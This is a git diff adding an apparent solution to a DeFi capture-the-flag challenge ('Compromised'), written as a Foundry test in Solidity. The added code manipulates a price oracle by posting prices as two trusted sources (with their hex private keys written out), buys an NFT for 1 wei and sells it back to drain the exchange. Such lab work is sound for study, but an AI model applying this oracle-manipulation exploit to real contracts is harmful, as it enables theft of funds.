@@ -2,6 +2,8 @@
 pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
+import "openzeppelin-contracts/utils/Base64.sol";
 
 import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
 import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
@@ -76,6 +78,58 @@ contract Compromised is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+
+        bytes32 TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
+        bytes32 INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");
+        string memory symbol = "DVNFT";
+
+        console2.log("My address: %s - Exchange address: %s - TrustfulOracle address: %s", address(attacker), address(exchange), address(trustfulOracle));
+        console2.log("Exchange related addresses - oracle address: %s", address(exchange.oracle()));
+        console2.log("Trusted oracle addresses:");
+        uint8 numberOfSources = uint8(trustfulOracle.getNumberOfSources());
+        address[] memory sources = new address[](3); 
+        for (uint8 i = 0; i < numberOfSources; i++) {
+            address sourceAddress = trustfulOracle.getRoleMember(TRUSTED_SOURCE_ROLE, i);
+            sources[i] = sourceAddress;
+            console2.log("Source %s - Address %s - Price %s", i, sourceAddress, trustfulOracle.getPriceBySource(symbol, sourceAddress));
+        }
+
+        console2.log("Median price for %s: %s", symbol, trustfulOracle.getMedianPrice(symbol));
+     
+        bytes32 source1PKey = bytes32(abi.encodePacked(hex"c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"));
+        bytes32 source2PKey = bytes32(abi.encodePacked(hex"208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"));
+
+        vm.stopPrank();
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice(symbol, 0);
+        vm.prank(sources[2]);
+        trustfulOracle.postPrice(symbol, 0);
+
+        vm.startPrank(attacker);
+        
+        console2.log("After manipulation, price for %s: %s", symbol, trustfulOracle.getMedianPrice(symbol));
+        uint tokenId = exchange.buyOne{value: 1}();
+        vm.stopPrank();
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice(symbol, address(exchange).balance);
+        vm.prank(sources[2]);
+        trustfulOracle.postPrice(symbol, address(exchange).balance);
+        
+        vm.startPrank(attacker);
+        console2.log("After manipulation, price for %s: %s", symbol, trustfulOracle.getMedianPrice(symbol));
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        vm.prank(sources[1]);
+        trustfulOracle.postPrice(symbol, INITIAL_NFT_PRICE);
+        vm.prank(sources[2]);
+        trustfulOracle.postPrice(symbol, INITIAL_NFT_PRICE);
+        
 
         /** EXPLOIT END **/
         validation();
